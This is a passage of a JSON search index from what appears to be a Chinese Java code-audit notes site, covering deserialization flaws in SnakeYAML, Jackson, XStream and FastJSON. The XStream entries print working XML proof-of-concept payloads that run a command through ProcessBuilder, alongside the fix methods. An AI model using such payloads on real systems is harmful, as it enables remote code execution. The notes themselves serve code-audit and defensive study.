\u627e\u5230\u53ef\u7591\u7684sql\u8bed\u53e5\u540e\u5c31\u770bxml\u6807\u7b7e\u91cc\u7684id\u5c5e\u6027\u5b9a\u4f4d\u5230\u8c03\u7528\u7c7b\uff0c\u5982\u679c\u80fd\u4e00\u6b65\u5b9a\u4f4d\u5230controller\u6700\u597d\uff0c\u7136\u540e\u5411\u4e0a\u6478\u7d22\u3002","title":"\u5173\u952e\u5b57"},{"location":"%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/JAVA/%E5%AE%A1%E8%AE%A1%E6%8A%80%E5%B7%A7/%E6%9C%89%E6%9C%BA%E5%8F%AF%E4%B9%98%E7%9A%84%E7%BB%84%E4%BB%B6/Snakeyml%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/Snakeyml%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/","text":"Snakeyml\u53cd\u5e8f\u5217\u5316 \u76ee\u5f55 snakeymal\u7684\u5e8f\u5217\u5316\u548c\u53cd\u5e8f\u5217\u5316 JdbcRowSetImpl\u5229\u7528\u94fe java\u4e00\u4e2a\u7528\u4e8e\u5bf9\u8c61\u4ee5ymal\u6587\u4ef6\u5185\u5bb9\u5f62\u5f0f\u8fdb\u884c\u5e8f\u5217\u5316\u548c\u53cd\u5e8f\u5217\u5316\u7684\u7ec4\u4ef6\u3002 \u5177\u4f53\u539f\u7406\u548cfastjson\u5341\u5206\u76f8\u4f3c\uff0c\u5e8f\u5217\u5316\u65f6\u8c03\u7528getter\uff0c\u53cd\u5e8f\u5217\u5316\u65f6\u8c03\u7528setter snakeymal\u7684\u5e8f\u5217\u5316\u548c\u53cd\u5e8f\u5217\u5316 JdbcRowSetImpl\u5229\u7528\u94fe \u6253jndi\u7684\u5e38\u89c4\u94fe","title":"Snakeyml\u53cd\u5e8f\u5217\u5316"},{"location":"%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/JAVA/%E5%AE%A1%E8%AE%A1%E6%8A%80%E5%B7%A7/%E6%9C%89%E6%9C%BA%E5%8F%AF%E4%B9%98%E7%9A%84%E7%BB%84%E4%BB%B6/Snakeyml%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/Snakeyml%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/#snakeyml","text":"","title":"Snakeyml\u53cd\u5e8f\u5217\u5316"},{"location":"%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/JAVA/%E5%AE%A1%E8%AE%A1%E6%8A%80%E5%B7%A7/%E6%9C%89%E6%9C%BA%E5%8F%AF%E4%B9%98%E7%9A%84%E7%BB%84%E4%BB%B6/Snakeyml%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/Snakeyml%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/#_1","text":"snakeymal\u7684\u5e8f\u5217\u5316\u548c\u53cd\u5e8f\u5217\u5316 JdbcRowSetImpl\u5229\u7528\u94fe java\u4e00\u4e2a\u7528\u4e8e\u5bf9\u8c61\u4ee5ymal\u6587\u4ef6\u5185\u5bb9\u5f62\u5f0f\u8fdb\u884c\u5e8f\u5217\u5316\u548c\u53cd\u5e8f\u5217\u5316\u7684\u7ec4\u4ef6\u3002 \u5177\u4f53\u539f\u7406\u548cfastjson\u5341\u5206\u76f8\u4f3c\uff0c\u5e8f\u5217\u5316\u65f6\u8c03\u7528getter\uff0c\u53cd\u5e8f\u5217\u5316\u65f6\u8c03\u7528setter","title":"\u76ee\u5f55"},{"location":"%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/JAVA/%E5%AE%A1%E8%AE%A1%E6%8A%80%E5%B7%A7/%E6%9C%89%E6%9C%BA%E5%8F%AF%E4%B9%98%E7%9A%84%E7%BB%84%E4%BB%B6/Snakeyml%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/Snakeyml%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/#snakeymal","text":"","title":"snakeymal\u7684\u5e8f\u5217\u5316\u548c\u53cd\u5e8f\u5217\u5316"},{"location":"%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/JAVA/%E5%AE%A1%E8%AE%A1%E6%8A%80%E5%B7%A7/%E6%9C%89%E6%9C%BA%E5%8F%AF%E4%B9%98%E7%9A%84%E7%BB%84%E4%BB%B6/Snakeyml%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/Snakeyml%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/#jdbcrowsetimpl","text":"\u6253jndi\u7684\u5e38\u89c4\u94fe","title":"JdbcRowSetImpl\u5229\u7528\u94fe"},{"location":"%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/JAVA/%E5%AE%A1%E8%AE%A1%E6%8A%80%E5%B7%A7/%E6%9C%89%E6%9C%BA%E5%8F%AF%E4%B9%98%E7%9A%84%E7%BB%84%E4%BB%B6/jackson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/jackson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/","text":"jackson\u53cd\u5e8f\u5217\u5316 \u76ee\u5f55 \u7b80\u4ecb \u539f\u7406 \u5173\u952e\u5b57 \u7b80\u4ecb \u529f\u80fd\u548cfastjson\u4e00\u6bdb\u4e00\u6837\uff0c\u628ajava\u5bf9\u8c61\u5e8f\u5217\u5316\u4e3ajson\u6216json\u53cd\u5e8f\u5217\u5316\u4e3ajava\u5bf9\u8c61 \u539f\u7406 \u4e0efastjson\u4e0d\u540c\u7684\u662f\uff0cfastjson\u5728\u53cd\u5e8f\u5217\u5316\u65f6\u4f1a\u8c03\u7528\u6784\u9020\u65b9\u6cd5+setter+getter \u800cjackson\u53cd\u5e8f\u5217\u5316\u65f6\u53ea\u8c03\u7528\u6784\u9020\u65b9\u6cd5+setter \u5173\u952e\u5b57 .readValue","title":"jackson\u53cd\u5e8f\u5217\u5316"},{"location":"%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/JAVA/%E5%AE%A1%E8%AE%A1%E6%8A%80%E5%B7%A7/%E6%9C%89%E6%9C%BA%E5%8F%AF%E4%B9%98%E7%9A%84%E7%BB%84%E4%BB%B6/jackson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/jackson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/#jackson","text":"","title":"jackson\u53cd\u5e8f\u5217\u5316"},{"location":"%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/JAVA/%E5%AE%A1%E8%AE%A1%E6%8A%80%E5%B7%A7/%E6%9C%89%E6%9C%BA%E5%8F%AF%E4%B9%98%E7%9A%84%E7%BB%84%E4%BB%B6/jackson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/jackson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/#_1","text":"\u7b80\u4ecb \u539f\u7406 \u5173\u952e\u5b57","title":"\u76ee\u5f55"},{"location":"%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/JAVA/%E5%AE%A1%E8%AE%A1%E6%8A%80%E5%B7%A7/%E6%9C%89%E6%9C%BA%E5%8F%AF%E4%B9%98%E7%9A%84%E7%BB%84%E4%BB%B6/jackson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/jackson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/#_2","text":"\u529f\u80fd\u548cfastjson\u4e00\u6bdb\u4e00\u6837\uff0c\u628ajava\u5bf9\u8c61\u5e8f\u5217\u5316\u4e3ajson\u6216json\u53cd\u5e8f\u5217\u5316\u4e3ajava\u5bf9\u8c61","title":"\u7b80\u4ecb"},{"location":"%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/JAVA/%E5%AE%A1%E8%AE%A1%E6%8A%80%E5%B7%A7/%E6%9C%89%E6%9C%BA%E5%8F%AF%E4%B9%98%E7%9A%84%E7%BB%84%E4%BB%B6/jackson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/jackson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/#_3","text":"\u4e0efastjson\u4e0d\u540c\u7684\u662f\uff0cfastjson\u5728\u53cd\u5e8f\u5217\u5316\u65f6\u4f1a\u8c03\u7528\u6784\u9020\u65b9\u6cd5+setter+getter \u800cjackson\u53cd\u5e8f\u5217\u5316\u65f6\u53ea\u8c03\u7528\u6784\u9020\u65b9\u6cd5+setter","title":"\u539f\u7406"},{"location":"%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/JAVA/%E5%AE%A1%E8%AE%A1%E6%8A%80%E5%B7%A7/%E6%9C%89%E6%9C%BA%E5%8F%AF%E4%B9%98%E7%9A%84%E7%BB%84%E4%BB%B6/jackson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/jackson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/#_4","text":".readValue","title":"\u5173\u952e\u5b57"},{"location":"%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/JAVA/%E5%AE%A1%E8%AE%A1%E6%8A%80%E5%B7%A7/%E6%9C%89%E6%9C%BA%E5%8F%AF%E4%B9%98%E7%9A%84%E7%BB%84%E4%BB%B6/springboot/springboot/","text":"springboot","title":"springboot"},{"location":"%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/JAVA/%E5%AE%A1%E8%AE%A1%E6%8A%80%E5%B7%A7/%E6%9C%89%E6%9C%BA%E5%8F%AF%E4%B9%98%E7%9A%84%E7%BB%84%E4%BB%B6/springboot/springboot/#springboot","text":"","title":"springboot"},{"location":"%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/JAVA/%E5%AE%A1%E8%AE%A1%E6%8A%80%E5%B7%A7/%E6%9C%89%E6%9C%BA%E5%8F%AF%E4%B9%98%E7%9A%84%E7%BB%84%E4%BB%B6/xstream%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/xstream%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/","text":"xstream \u53cd\u5e8f\u5217\u5316 \u76ee\u5f55 \u7b80\u4ecb \u539f\u7406 poc \u4fee\u590d cve\u901f\u67e5 \u5173\u952e\u5b57 \u7b80\u4ecb \u80fd\u628ajava\u5bf9\u8c61\u4ecexml\u53cd\u5e8f\u5217\u5316\u51fa\u6765\uff0c\u4e5f\u53ef\u4ee5\u53cd\u5411\u64cd\u4f5c\u3002 \u539f\u7406 \u5148\u4e00\u8a00\u4ee5\u853d\u4e4b\uff1aXStream\u652f\u6301\u4e00\u4e2a\u540d\u4e3aDynamicProxyConverter\u7684\u8f6c\u6362\u5668\uff0c\u8be5\u8f6c\u6362\u5668\u53ef\u4ee5\u5c06XML\u4e2ddynamic-proxy\u6807\u7b7e\u5185\u5bb9\u8f6c\u6362\u6210\u52a8\u6001\u4ee3\u7406\u7c7b\u5bf9\u8c61\u3002\u5728\u53cd\u5e8f\u5217\u5316\u8fc7\u7a0b\u4e2d\uff0c\u5f53\u7a0b\u5e8f\u8c03\u7528\u4e86dynamic-proxy\u6807\u7b7e\u5185\u7684interface\u6807\u7b7e\u6307\u5411\u7684\u63a5\u53e3\u7c7b\u58f0\u660e\u7684\u65b9\u6cd5\u65f6\uff0c\u5c31\u4f1a\u901a\u8fc7\u52a8\u6001\u4ee3\u7406\u673a\u5236\u4ee3\u7406\u8bbf\u95eedynamic-proxy\u6807\u7b7e\u5185handler\u6807\u7b7e\u6307\u5b9a\u7684\u7c7b\u65b9\u6cd5\uff1b\u53ea\u9700interface\u6807\u7b7e\u6307\u5411\u76ee\u6807\u7a0b\u5e8f\u5fc5\u7136\u4f1a\u8c03\u7528\u7684\u63a5\u53e3\u7c7b\u65b9\u6cd5\uff0c\u90a3\u4e48handler\u6307\u5b9a\u7684\u7c7b\u65b9\u6cd5\uff08\u4e00\u822c\u4e3aeventhandler\u7c7b,\u56e0\u4e3a\u5b83\u53ef\u4ee5\u901a\u8fc7\u5185\u90e8\u7684\u53cd\u5c04\u9020\u6210\u4efb\u610f\u65b9\u6cd5\u6267\u884c\uff09\u4e00\u5b9a\u5c31\u4f1a\u88ab\u6267\u884c\u4ece\u800c\u9020\u6210\u653b\u51fb poc \u9002\u7528\u7248\u672c xstream=1.4.10 \u6216\u5c0f\u4e8e1.4.6 eventhandler.invoke\u2192eventhandler.invokeInternal\u2192MethodUtil.invoke \u5728\u8fd9\u4e2a\u8c03\u7528\u94fe\u4e2d\u51fa\u4f20\u5165\u8981\u6267\u884c\u7684\u65b9\u6cd5\u548c\u53c2\u6570\u5373\u53ef\uff0c\u5728\u4e0b\u9762\u7684poc\u4e2d\u5c55\u793a <tree-map> <entry> <dynamic-proxy> <interface>java.lang.Comparable</interface> <handler class=\"java.beans.EventHandler\"> <target class=\"java.lang.ProcessBuilder\"> <command> <string>open</string> <string>-na</string> <string>Calculator</string> </command> </target> <action>start</action> </handler> </dynamic-proxy> <string>good</string> </entry> </tree-map> java.lang.Comparable\u4f5c\u4e3a\u4e00\u4e2a\u9879\u76ee\u4e2d\u57fa\u672c\u5fc5\u7528\u5230\u7684interfae\uff0c\u81ea\u7136\u5c31\u653e\u5230interface\u6807\u7b7e\u91cc\u4e86\u3002 \u53e6\u4e00\u4e2apoc \u7248\u672c\uff1a1.4.5\uff0c1.4.6\uff0c1.4.10 <sorted-set> <dynamic-proxy> <interface>java.lang.Comparable</interface> <handler class=\"java.beans.EventHandler\"> <target class=\"java.lang.ProcessBuilder\"> <command> <string>open</string> <string>-na</string> <string>Calculator</string> </command> </target> <action>start</action> </handler> </dynamic-proxy> </sorted-set> \u4fee\u590d \u82e5\u7248\u672c\u53f7>=1.4.7\uff0cXStream\u63d0\u4f9b\u4e86\u4e00\u4e2a\u5b89\u5168\u6846\u67b6\u4f9b\u7528\u6237\u4f7f\u7528\uff0c\u4f46\u5fc5\u987b\u624b\u5de5\u8bbe\u7f6e\uff0c\u5efa\u7acb\u9ed1\u767d\u540d\u5355\u673a\u5236\u8fdb\u884c\u8fc7\u6ee4\uff1a XStream.addPermission(TypePermission); XStream.allowTypes(Class[]); XStream.allowTypes(String[]); XStream.allowTypesByRegExp(String[]); XStream.allowTypesByRegExp(Pattern[]); XStream.allowTypesByWildcard(String[]); XStream.allowTypeHierary(Class); XStream.denyPermission(TypePermission); XStream.denyTypes(Class[]); XStream.denyTypes(String[]); XStream.denyTypesByRegExp(String[]); XStream.denyTypesByRegExp(Pattern[]); XStream.denyTypesByWildcard(String[]); XStream.denyTypeHierary(Class); \u57281.4.10\u7248\u672c\u4e4b\u540e\uff0cXStream\u63d0\u4f9b\u4e86XStream.setupDefaultSecurity()\u51fd\u6570\u6765\u8bbe\u7f6eXStream\u53cd\u5e8f\u5217\u5316\u7c7b\u578b\u7684\u9ed8\u8ba4 \u767d\u540d\u5355 \uff0c\u90e8\u5206\u767d\u540d\u5355\u662fXstream\u9ed8\u8ba4\u7684\uff0c\u7528\u6237\u53ef\u4ee5\u76f4\u63a5\u8c03\u7528\u3002 cve\u901f\u67e5 \u5b98\u7f51\u826f\u5fc3\uff0c\u5e76\u7ed9\u6bcf\u4e2acve\u63d0\u4f9b\u4e86poc https://x-stream.github.io/security.html 1.4.18\u662f\u76ee\u524d\u6700\u5b89\u5168\u7684\u7248\u672c\uff0c\u9047\u5230\u4e0d\u7528\u770b\u4e86\u2014\u20142023.3 \u5173\u952e\u5b57 fromXml","title":"xstream \u53cd\u5e8f\u5217\u5316"},{"location":"%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/JAVA/%E5%AE%A1%E8%AE%A1%E6%8A%80%E5%B7%A7/%E6%9C%89%E6%9C%BA%E5%8F%AF%E4%B9%98%E7%9A%84%E7%BB%84%E4%BB%B6/xstream%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/xstream%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/#xstream","text":"","title":"xstream \u53cd\u5e8f\u5217\u5316"},{"location":"%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/JAVA/%E5%AE%A1%E8%AE%A1%E6%8A%80%E5%B7%A7/%E6%9C%89%E6%9C%BA%E5%8F%AF%E4%B9%98%E7%9A%84%E7%BB%84%E4%BB%B6/xstream%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/xstream%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/#_1","text":"\u7b80\u4ecb \u539f\u7406 poc \u4fee\u590d cve\u901f\u67e5 \u5173\u952e\u5b57","title":"\u76ee\u5f55"},{"location":"%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/JAVA/%E5%AE%A1%E8%AE%A1%E6%8A%80%E5%B7%A7/%E6%9C%89%E6%9C%BA%E5%8F%AF%E4%B9%98%E7%9A%84%E7%BB%84%E4%BB%B6/xstream%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/xstream%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/#_2","text":"\u80fd\u628ajava\u5bf9\u8c61\u4ecexml\u53cd\u5e8f\u5217\u5316\u51fa\u6765\uff0c\u4e5f\u53ef\u4ee5\u53cd\u5411\u64cd\u4f5c\u3002","title":"\u7b80\u4ecb"},{"location":"%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/JAVA/%E5%AE%A1%E8%AE%A1%E6%8A%80%E5%B7%A7/%E6%9C%89%E6%9C%BA%E5%8F%AF%E4%B9%98%E7%9A%84%E7%BB%84%E4%BB%B6/xstream%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/xstream%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/#_3","text":"\u5148\u4e00\u8a00\u4ee5\u853d\u4e4b\uff1aXStream\u652f\u6301\u4e00\u4e2a\u540d\u4e3aDynamicProxyConverter\u7684\u8f6c\u6362\u5668\uff0c\u8be5\u8f6c\u6362\u5668\u53ef\u4ee5\u5c06XML\u4e2ddynamic-proxy\u6807\u7b7e\u5185\u5bb9\u8f6c\u6362\u6210\u52a8\u6001\u4ee3\u7406\u7c7b\u5bf9\u8c61\u3002\u5728\u53cd\u5e8f\u5217\u5316\u8fc7\u7a0b\u4e2d\uff0c\u5f53\u7a0b\u5e8f\u8c03\u7528\u4e86dynamic-proxy\u6807\u7b7e\u5185\u7684interface\u6807\u7b7e\u6307\u5411\u7684\u63a5\u53e3\u7c7b\u58f0\u660e\u7684\u65b9\u6cd5\u65f6\uff0c\u5c31\u4f1a\u901a\u8fc7\u52a8\u6001\u4ee3\u7406\u673a\u5236\u4ee3\u7406\u8bbf\u95eedynamic-proxy\u6807\u7b7e\u5185handler\u6807\u7b7e\u6307\u5b9a\u7684\u7c7b\u65b9\u6cd5\uff1b\u53ea\u9700interface\u6807\u7b7e\u6307\u5411\u76ee\u6807\u7a0b\u5e8f\u5fc5\u7136\u4f1a\u8c03\u7528\u7684\u63a5\u53e3\u7c7b\u65b9\u6cd5\uff0c\u90a3\u4e48handler\u6307\u5b9a\u7684\u7c7b\u65b9\u6cd5\uff08\u4e00\u822c\u4e3aeventhandler\u7c7b,\u56e0\u4e3a\u5b83\u53ef\u4ee5\u901a\u8fc7\u5185\u90e8\u7684\u53cd\u5c04\u9020\u6210\u4efb\u610f\u65b9\u6cd5\u6267\u884c\uff09\u4e00\u5b9a\u5c31\u4f1a\u88ab\u6267\u884c\u4ece\u800c\u9020\u6210\u653b\u51fb","title":"\u539f\u7406"},{"location":"%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/JAVA/%E5%AE%A1%E8%AE%A1%E6%8A%80%E5%B7%A7/%E6%9C%89%E6%9C%BA%E5%8F%AF%E4%B9%98%E7%9A%84%E7%BB%84%E4%BB%B6/xstream%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/xstream%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/#poc","text":"\u9002\u7528\u7248\u672c xstream=1.4.10 \u6216\u5c0f\u4e8e1.4.6 eventhandler.invoke\u2192eventhandler.invokeInternal\u2192MethodUtil.invoke \u5728\u8fd9\u4e2a\u8c03\u7528\u94fe\u4e2d\u51fa\u4f20\u5165\u8981\u6267\u884c\u7684\u65b9\u6cd5\u548c\u53c2\u6570\u5373\u53ef\uff0c\u5728\u4e0b\u9762\u7684poc\u4e2d\u5c55\u793a <tree-map> <entry> <dynamic-proxy> <interface>java.lang.Comparable</interface> <handler class=\"java.beans.EventHandler\"> <target class=\"java.lang.ProcessBuilder\"> <command> <string>open</string> <string>-na</string> <string>Calculator</string> </command> </target> <action>start</action> </handler> </dynamic-proxy> <string>good</string> </entry> </tree-map> java.lang.Comparable\u4f5c\u4e3a\u4e00\u4e2a\u9879\u76ee\u4e2d\u57fa\u672c\u5fc5\u7528\u5230\u7684interfae\uff0c\u81ea\u7136\u5c31\u653e\u5230interface\u6807\u7b7e\u91cc\u4e86\u3002 \u53e6\u4e00\u4e2apoc \u7248\u672c\uff1a1.4.5\uff0c1.4.6\uff0c1.4.10 <sorted-set> <dynamic-proxy> <interface>java.lang.Comparable</interface> <handler class=\"java.beans.EventHandler\"> <target class=\"java.lang.ProcessBuilder\"> <command> <string>open</string> <string>-na</string> <string>Calculator</string> </command> </target> <action>start</action> </handler> </dynamic-proxy> </sorted-set>","title":"poc"},{"location":"%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/JAVA/%E5%AE%A1%E8%AE%A1%E6%8A%80%E5%B7%A7/%E6%9C%89%E6%9C%BA%E5%8F%AF%E4%B9%98%E7%9A%84%E7%BB%84%E4%BB%B6/xstream%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/xstream%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/#_4","text":"\u82e5\u7248\u672c\u53f7>=1.4.7\uff0cXStream\u63d0\u4f9b\u4e86\u4e00\u4e2a\u5b89\u5168\u6846\u67b6\u4f9b\u7528\u6237\u4f7f\u7528\uff0c\u4f46\u5fc5\u987b\u624b\u5de5\u8bbe\u7f6e\uff0c\u5efa\u7acb\u9ed1\u767d\u540d\u5355\u673a\u5236\u8fdb\u884c\u8fc7\u6ee4\uff1a XStream.addPermission(TypePermission); XStream.allowTypes(Class[]); XStream.allowTypes(String[]); XStream.allowTypesByRegExp(String[]); XStream.allowTypesByRegExp(Pattern[]); XStream.allowTypesByWildcard(String[]); XStream.allowTypeHierary(Class); XStream.denyPermission(TypePermission); XStream.denyTypes(Class[]); XStream.denyTypes(String[]); XStream.denyTypesByRegExp(String[]); XStream.denyTypesByRegExp(Pattern[]); XStream.denyTypesByWildcard(String[]); XStream.denyTypeHierary(Class); \u57281.4.10\u7248\u672c\u4e4b\u540e\uff0cXStream\u63d0\u4f9b\u4e86XStream.setupDefaultSecurity()\u51fd\u6570\u6765\u8bbe\u7f6eXStream\u53cd\u5e8f\u5217\u5316\u7c7b\u578b\u7684\u9ed8\u8ba4 \u767d\u540d\u5355 \uff0c\u90e8\u5206\u767d\u540d\u5355\u662fXstream\u9ed8\u8ba4\u7684\uff0c\u7528\u6237\u53ef\u4ee5\u76f4\u63a5\u8c03\u7528\u3002","title":"\u4fee\u590d"},{"location":"%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/JAVA/%E5%AE%A1%E8%AE%A1%E6%8A%80%E5%B7%A7/%E6%9C%89%E6%9C%BA%E5%8F%AF%E4%B9%98%E7%9A%84%E7%BB%84%E4%BB%B6/xstream%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/xstream%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/#cve","text":"\u5b98\u7f51\u826f\u5fc3\uff0c\u5e76\u7ed9\u6bcf\u4e2acve\u63d0\u4f9b\u4e86poc https://x-stream.github.io/security.html 1.4.18\u662f\u76ee\u524d\u6700\u5b89\u5168\u7684\u7248\u672c\uff0c\u9047\u5230\u4e0d\u7528\u770b\u4e86\u2014\u20142023.3","title":"cve\u901f\u67e5"},{"location":"%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/JAVA/%E5%AE%A1%E8%AE%A1%E6%8A%80%E5%B7%A7/%E6%9C%89%E6%9C%BA%E5%8F%AF%E4%B9%98%E7%9A%84%E7%BB%84%E4%BB%B6/xstream%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/xstream%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/#_5","text":"fromXml","title":"\u5173\u952e\u5b57"},{"location":"%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/JAVA/%E5%AE%A1%E8%AE%A1%E6%8A%80%E5%B7%A7/%E6%9C%89%E6%9C%BA%E5%8F%AF%E4%B9%98%E7%9A%84%E7%BB%84%E4%BB%B6/%E6%B5%85%E6%9E%90FastJSON%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/%E6%B5%85%E6%9E%90FastJSON%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/","text":"\u6d45\u6790FastJSON\u53cd\u5e8f\u5217\u5316\u6f0f\u6d1e \u76ee\u5f55 FastJSON \u7b80\u4ecb FASTJSON\u548b\u7528 FASTJSON \u53cd\u5e8f\u5217\u5316\u6f0f\u6d1e\u8d77\u6e90 \u5404\u7248\u672c\u590d\u73b0 1.2.24 TemplatesImpl JdbcRowSetImpl 1.2.25 \u66f4\u65b0\u673a\u5236 bypass 1\uff08L;\u6cd5\uff091.2.25-1.2.41 bypass 2\uff08json\u5185\u7f6e\uff091.2.25-1.2.47 1.2.42 \u66f4\u65b0\u673a\u5236 bypass\uff08\u53cc\u5199\u7ed5\u8fc7\uff09 1.2.42 \u66f4\u65b0\u673a\u5236 Bypass 1.2.44 \u66f4\u65b0\u673a\u5236 Bypass 1.2.47-67 \u66f4\u65b0\u673a\u5236 1.2.68 Bypass expectClass\u7ed5\u8fc7AutoType <=1.2.68 \u8c03\u8bd5 \u5b9e\u6218Gadget \u6f0f\u6d1e\u68c0\u6d4b DNSLOG \u62a5\u9519\u68c0\u6d4b \u7ed5\u8fc7\u5f02\u5e38 \u5ba1\u8ba1\u5173\u952e\u5b57 \u53c2\u8003 FastJSON \u7b80\u4ecb FastJson \u662f\u4e00\u4e2a\u7531\u963f\u91cc\u5df4\u5df4\u7814\u53d1\u7684java\u5e93\uff0c\u53ef\u4ee5\u628ajava\u5bf9\u8c61\u8f6c\u6362\u4e3aJSON\u683c\u5f0f\uff0c\u4e5f\u53ef\u4ee5\u628aJSON\u5b57\u7b26\u4e32\u8f6c\u6362\u4e3a\u5bf9\u8c61\u3002 https://github.com/alibaba/fastjson \ud83d\udc48\u9879\u76ee\u5730\u5740 \u201c\u81ea2017\u5e743\u670815\u65e5\uff0cfastjson\u5b98\u65b9\u4e3b\u52a8\u7206\u51fa\u5176\u5728 1.2.24 \u53ca\u4e4b\u524d\u7248\u672c\u5b58\u5728\u8fdc\u7a0b\u4ee3\u7801\u6267\u884c\u9ad8\u5371\u5b89\u5168\u6f0f\u6d1e\u4ee5\u6765\uff0c\u5404\u79cd\u65b0\u578b\u7ed5\u8fc7\u59ff\u52bf\u5c42\u51fa\u4e0d\u7a77\u3002\u201c\u2014\u2014c014 FASTJSON\u548b\u7528 \u7b54\u6848\uff1a\u76f4\u63a5POM\u5bfc\u5165\uff0c\u65b9\u4fbf\u5730\u4e00\u6279 <dependencies> <dependency> <groupId>com.alibaba</groupId> <artifactId>fastjson</artifactId> <version>x.x.xx</version> </dependency> </dependencies> import com.alibaba.fastjson.JSON fastjson\u6709\u4e24\u79cd\u5e38\u89c1\u7684\u5904\u7406JSON\u7684\u65b9\u6cd5 JSON.toJSONString() \u65b9\u6cd5\uff1a\u53ef\u5c06\u5bf9\u8c61\u8f6c\u6362\u6210 JSON \u5b57\u7b26\u4e32 JSON.parseObject() \u65b9\u6cd5\uff1a\u5c06 JSON \u5b57\u7b26\u4e32\u8f6c\u6362\u6210\u5bf9\u8c61\u3002 \u4e0b\u9762\u770b\u4e00\u6ce2\u5b9e\u4f8b\uff1a\u521b\u5efa\u4e00\u4e2a\u5bf9\u8c61\uff0c\u5c06\u5176\u8f6c\u4e3aJSON\uff0c\u7136\u540e\u518d\u8f6c\u56de\u5bf9\u8c61\u3002 \u540c\u65f6\u53ef\u4ee5\u53d1\u73b0\uff0c\u5728JSON\u5e8f\u5217\u5316\u65f6\uff0c\u4f1a\u8c03\u7528\u7c7b\u7684getxxx\u65b9\u6cd5\uff1b\u5728JSON\u53cd\u5e8f\u5217\u5316\u65f6\uff0c\u4f1a\u8c03\u7528\u7c7b\u7684\u6784\u9020\u65b9\u6cd5 public class App { public static class User{ private String id; User(){ System.out.println(\"User go\"); } public void setId(String ids){ System.out.println(\"setId go\"); this.id=ids; } public String getId(){ System.out.println(\"GetId go\"); return this.id; } } public static void main(String[] args){ User a = new User(); String json = JSON.toJSONString(a); System.out.println(json); System.out.println(JSON.parseObject(json,User.class)); } } User go GetId go {} User go org.example.App$User@36d4b5c FASTJSON \u53cd\u5e8f\u5217\u5316\u6f0f\u6d1e\u8d77\u6e90 \u6211\u4eec\u53ef\u4ee5\u770b\u5230\uff0c\u628aJSON\u53cd\u5e8f\u5217\u5316\u7684\u8bed\u53e5\u662f 